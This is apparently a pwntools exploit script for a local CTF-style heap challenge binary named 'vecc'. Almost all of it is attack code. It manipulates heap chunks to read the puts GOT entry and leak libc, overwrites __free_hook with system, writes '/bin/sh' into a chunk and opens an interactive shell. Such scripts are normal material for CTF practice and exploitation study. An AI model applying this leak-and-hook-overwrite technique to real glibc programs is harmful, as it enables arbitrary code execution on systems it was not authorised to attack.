#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./vecc')

'''
GOT protection: Full RELRO | GOT functions: 12

[0x601f90] free@GLIBC_2.2.5 -> 0x7ffb65358950 (free) __ push   r15
[0x601f98] putchar@GLIBC_2.2.5 -> 0x7ffb65343810 (putchar) __ push   rbx
[0x601fa0] puts@GLIBC_2.2.5 -> 0x7ffb653419c0 (puts) __ push   r13
[0x601fa8] fread@GLIBC_2.2.5 -> 0x7ffb65340380 (fread) __ push   r13
[0x601fb0] setbuf@GLIBC_2.2.5 -> 0x7ffb653494d0 (setbuf) __ mov    edx, 0x2000
[0x601fb8] printf@GLIBC_2.2.5 -> 0x7ffb65325e80 (printf) __ sub    rsp, 0xd8
[0x601fc0] fgets@GLIBC_2.2.5 -> 0x7ffb6533fb20 (fgets) __ test   esi, esi
[0x601fc8] strtol@GLIBC_2.2.5 -> 0x7ffb65306110 (strtoq) __ mov    rax, qword ptr [rip + 0x3a5cb1]
[0x601fd0] memcpy@GLIBC_2.14 -> 0x7ffb6544fad0 (__memmove_avx_unaligned_erms) __ mov    rax, rdi
[0x601fd8] malloc@GLIBC_2.2.5 -> 0x7ffb65358070 (malloc) __ push   rbp
[0x601fe0] realloc@GLIBC_2.2.5 -> 0x7ffb65359c30 (realloc) __ push   r15
[0x601fe8] fwrite@GLIBC_2.2.5 -> 0x7ffb653408a0 (fwrite) __ push   r15
'''

def add(idx):
    p.sendlineafter('>', str(1))
    p.sendlineafter('> ', str(idx))

def delete(idx):
    p.sendlineafter('>', str(2))
    p.sendlineafter('> ', str(idx))

def append(idx, Len, payload):
    p.sendlineafter('>', str(3))
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(Len))
    p.send(payload)

def clear(idx):
    p.sendlineafter('>', str(4))
    p.sendlineafter('> ', str(idx))

def show(idx):
    p.sendlineafter('>', str(5))
    p.sendlineafter('> ', str(idx))

 
if __name__ == "__main__":
    add(1)
    add(2)
    add(3)
    
    delete(1)
    delete(2)
    delete(3)

    add(1) #-> 2
    add(2) #-> 3
    add(3)

    clear(2)
    payload = p64(0x601fa0) + p32(0x8) + '\x00' * 4
    append(2, 12, payload)
    show(3)
    libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x0809c0
    success('LIBC: ' + str(hex(libc)))

    __malloc_hook = libc + 0x00000000003ebc30
    __free_hook = libc + 0x00000000003ed8e8
    __realloc_hook = libc + 0x00000000003ebc28
    system = libc + 0x04f440
    sh = libc + 0x1b3e9a
    
    clear(2)
    gdb.attach(p, 'b *0x400938\n')
    payload = p64(__free_hook) + p32(0)  +  'a' * 4
    append(2, 16, payload)
    payload = p64(system)
    append(3, 8, payload)

    clear(2)
    payload = '/bin/sh\x00'
    append(2, 8, payload)

    p.interactive()

